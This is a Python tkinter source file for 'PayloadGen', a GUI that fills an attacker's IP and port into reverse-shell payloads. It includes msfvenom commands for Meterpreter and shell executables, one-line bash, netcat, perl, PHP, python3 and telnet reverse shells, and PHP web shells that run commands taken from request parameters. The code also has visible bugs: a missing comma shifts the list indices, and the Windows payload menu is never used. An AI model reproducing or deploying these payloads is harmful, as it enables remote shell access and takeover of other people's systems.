import tkinter as tk
from tkinter import *
from tkinter import messagebox

# GUI design
root = Tk()
root.title("PayloadGen: Dynamic Reverse Shell Payload Creator")
root.resizable(False, False)
root.geometry("950x700+500+200")
root.configure(bg="black")

# Icon
icon = PhotoImage(file="logo.png")
root.iconphoto(True, icon)

# Logo
logo = PhotoImage(file="logo.png")
Label(root, image=logo, bg="black").place(x=175, y=7)
Label(root, text="PayloadGen", bd=3, bg="black", fg="red", font="arial 30 bold").place(x=270, y=20)

# Password label
lhost_label = tk.Label(root, text="IP:", bd=5, fg="white", bg="black", font="arial 12 bold")
lhost_label.place(x=140, y=140)

lport_label = tk.Label(root, text="PORT:", bd=5, fg="white", bg="black", font="arial 12 bold")
lport_label.place(x=500, y=140)

# Text box
lhost_entry = tk.Entry(root, show="", bd=5, fg="black", bg="white", font="arial 12 bold")
lhost_entry.place(x=170, y=140)

lport_entry = tk.Entry(root, show="", bd=5, fg="black", bg="white", font="arial 12 bold")
lport_entry.place(x=560, y=140)

generate_button = tk.Button(root, text="Generate Payload", font="arial 13 bold", fg="black", bg="light green",
                            command=lambda: generate_reverse_shell_payload())
generate_button.place(x=390, y=300)

copy_button = tk.Button(root, text="Copy", font="arial 13 bold", fg="black", bg="yellow", command=lambda: copy_to_clipboard())
copy_button.place(x=810, y=360)

# Result text
result_text = tk.Text(root, height=2, width=80, bd=5, font="arial 12 bold")
result_text.place(x=60, y=350)

# Create and position the payload selection dropdown
msf_payloads = [

    "Select MSFVenom Payload: ",
    "Windows Meterpreter Staged Reverse TCP(x64)",
    "Windows Meterpreter Stageless Reverse TCP(x64)",
    "Windows Staged Reverse TCP(x64)",
    "Windows Stageless Reverse TCP(x64)",
    "Linux Meterpreter Staged Reverse TCP(x64)",
    "Linux Stageless Reverse TCP(x64)",
    "Windows Bind TCP ShellCode",
    "PHP Meterpreter Stageless Reverse TCP",
    "PHP Reverse PHP",
    "Bash Stageless Reverse TCP",
]
msf_var = tk.StringVar(root)
msf_var.set(msf_payloads[0])  # Set default value
msf_dropdown = tk.OptionMenu(root, msf_var, *msf_payloads)
msf_dropdown.configure(font="arial 10 bold", fg="skyblue", bg="black")
msf_dropdown.pack()
msf_dropdown.place(x=130, y=200)

# Linux Payloads
linux_payloads = [

    "Select Linux Payload: ",
    "Bash-i",
    "Bash196",
    "Bash Read Line",
    "Bash 5",
    "Bash UDP",
    "nc mkfifo",
    "nc -e",
    "BusyBox nc -e",
    "nc -c",
    "ncat -e",
    "ncat UDP",
    "rustcat",
    "Perl no sh",
    "PHP cmd",
    "PHP cmd2",
    "PHP cmd small"
    "PHP exec",
    "Python3",
    "Telnet",
]
linux_var = tk.StringVar(root)
linux_var.set(linux_payloads[0])  # Set default value
linux_dropdown = tk.OptionMenu(root, linux_var, *linux_payloads)
linux_dropdown.configure(font="arial 10 bold", fg="yellow", bg="black")
linux_dropdown.pack()
linux_dropdown.place(x=370, y=250)

# Windows Payloads
window_payloads = [

    "Select Windows Payload: ",
    "nc.exe -e",
    "ncat.exe -e",
    "Bash Read Line",
    "Bash 5",
    "Bash UDP",
    "nc mkfifo",
    "nc -e",
    "BusyBox nc -e",
    "nc -c",
    "ncat -e",
    "ncat UDP",
    "rustcat",
    "C",
    "Perl",
    "Perl no sh",
    "Perl PentestMonkey",
    "PHP Pentest Monkey",
    "PHP cmd",
    "PHP cmd2",
    "PHP exec",
    "Python3",
    "Telnet",
]
windows_var = tk.StringVar(root)
windows_var.set(window_payloads[0])  # Set default value
window_dropdown = tk.OptionMenu(root, windows_var, *window_payloads)
window_dropdown.configure(font="arial 10 bold", fg="white", bg="black")
window_dropdown.pack()
window_dropdown.place(x=565, y=200)


def generate_reverse_shell_payload():
    lhost = lhost_entry.get()
    lport = lport_entry.get()
    msfpayload = msf_var.get()
    linuxpayload = linux_var.get()
    winpayload = windows_var.get()

    if msfpayload == msf_payloads[1]:
        payload_command = "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={} LPORT={} -f exe -o reverse.exe".format(lhost, lport)

    elif msfpayload == msf_payloads[2]:
        payload_command = "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={} LPORT={} -f exe -o reverse.exe".format(lhost, lport)

    elif msfpayload == msf_payloads[3]:
        payload_command = "msfvenom -p windows/x64/shell/reverse_tcp LHOST={} LPORT={} -f exe -o reverse.exe".format(lhost, lport)

    elif msfpayload == msf_payloads[4]:
        payload_command = "msfvenom -p windows/x64/shell_reverse_tcp LHOST={} LPORT={} -f exe -o reverse.exe".format(lhost, lport)

    elif msfpayload == msf_payloads[5]:
        payload_command = "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={} LPORT={} -f elf -o reverse.elf".format(lhost, lport)

    elif msfpayload == msf_payloads[6]:
        payload_command = "msfvenom -p linux/x64/shell_reverse_tcp LHOST={} LPORT={} -f elf -o reverse.elf".format(lhost, lport)

    elif msfpayload == msf_payloads[7]:
        payload_command = "msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '' -f python -v notBuf -o shellcode".format(
            lhost, lport)

    elif msfpayload == msf_payloads[8]:
        payload_command = "msfvenom -p php/meterpreter_reverse_tcp LHOST={} LPORT={} -f raw -o shell.php".format(lhost, lport)

    elif msfpayload == msf_payloads[9]:
        payload_command = "msfvenom -p php/reverse_php LHOST={} LPORT={} -o shell.php".format(lhost, lport)

    elif msfpayload == msf_payloads[10]:
        payload_command = "msfvenom -p cmd/unix/reverse_bash LHOST={} LPORT={} -f raw -o shell.sh".format(lhost, lport)

    elif linuxpayload == linux_payloads[1]:
        payload_command = "sh -i >& /dev/tcp/{}/{} 0>&1".format(lhost, lport)

    elif linuxpayload == linux_payloads[2]:
        payload_command = "0<&196;exec 196<>/dev/tcp/{}/{}; sh <&196 >&196 2>&196".format(lhost, lport)

    elif linuxpayload == linux_payloads[3]:
        payload_command = "exec 5<>/dev/tcp/{}/{};cat <&5 | while read line; do $line 2>&5 >&5; done".format(lhost, lport)

    elif linuxpayload == linux_payloads[4]:
        payload_command = "sh -i 5<> /dev/tcp/{}/{} 0<&5 1>&5 2>&5".format(lhost, lport)

    elif linuxpayload == linux_payloads[5]:
        payload_command = "sh -i >& /dev/udp/{}/{} 0>&1".format(lhost, lport)

    elif linuxpayload == linux_payloads[6]:
        payload_command = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {} {} >/tmp/f".format(lhost, lport)

    elif linuxpayload == linux_payloads[7]:
        payload_command = "nc {} {} -e sh".format(lhost, lport)

    elif linuxpayload == linux_payloads[8]:
        payload_command = "busybox nc {} {} -e sh".format(lhost, lport)

    elif linuxpayload == linux_payloads[9]:
        payload_command = "nc -c sh {} {}".format(lhost, lport)

    elif linuxpayload == linux_payloads[10]:
        payload_command = "ncat {} {} -e sh".format(lhost, lport)

    elif linuxpayload == linux_payloads[11]:
        payload_command = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u {} {} >/tmp/f".format(lhost, lport)

    elif linuxpayload == linux_payloads[12]:
        payload_command = "rcat {} {} -r sh".format(lhost, lport)

    elif linuxpayload == linux_payloads[13]:
        payload_command = "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{}:{}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'".format(
            lhost, lport)

    elif linuxpayload == linux_payloads[14]:
        payload_command = '''<html>
                             <body>
                             <form method=\"GET\" name=\"<?php echo basename($_SERVER[\'PHP_SELF\']); ?>\">
                             <input type=\"TEXT\" name="cmd" id=\"cmd\" size=\"80\">
                             <input type=\"SUBMIT\" value=\"Execute\">
                             </form>
                             <pre>
                             <?php
                                if(isset($_GET[\'cmd\']))
                                 {
                                     system($_GET[\'cmd\']);
                                 }
                             ?>
                             </pre>
                             </body>
                             <script>document.getElementById(\"cmd\").focus();</script>
                             </html>'''

    elif linuxpayload == linux_payloads[15]:
        payload_command = "<?php if(isset($_REQUEST[\'cmd\'])){ echo \"<pre>\"; $cmd = ($_REQUEST[\'cmd\']); system($cmd); echo \"</pre>\"; die; }?>"

    elif linuxpayload == linux_payloads[16]:
        payload_command = "<?=`$_GET[0]`?>"

    elif linuxpayload == linux_payloads[17]:
        payload_command = "php -r '$sock=fsockopen(\"{}\",{});exec(\"sh <&3 >&3 2>&3\");'".format(lhost, lport)

    elif linuxpayload == linux_payloads[18]:
        payload_command = "python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")\'".format(
            lhost, lport)

    elif linuxpayload == linux_payloads[19]:
        payload_command = "TF=$(mktemp -u);mkfifo $TF && telnet {} {} 0<$TF | sh 1>$TF".format(lhost, lport)

    else:
        payload_command = "Make a valid selection"

    # Delete existing text in box
    result_text.delete(1.0, END)

    # Inserting text in textbox
    result_text.insert(END, payload_command)


# Function to copy text to clipboard
def copy_to_clipboard():
    text = result_text.get("1.0", "end-1c")  # Get the text from the text box
    root.clipboard_clear()  # Clear the clipboard
    root.clipboard_append(text)  # Copy the text to the clipboard
    messagebox.showinfo("Success", "Text copied to clipboard!")


root.mainloop()
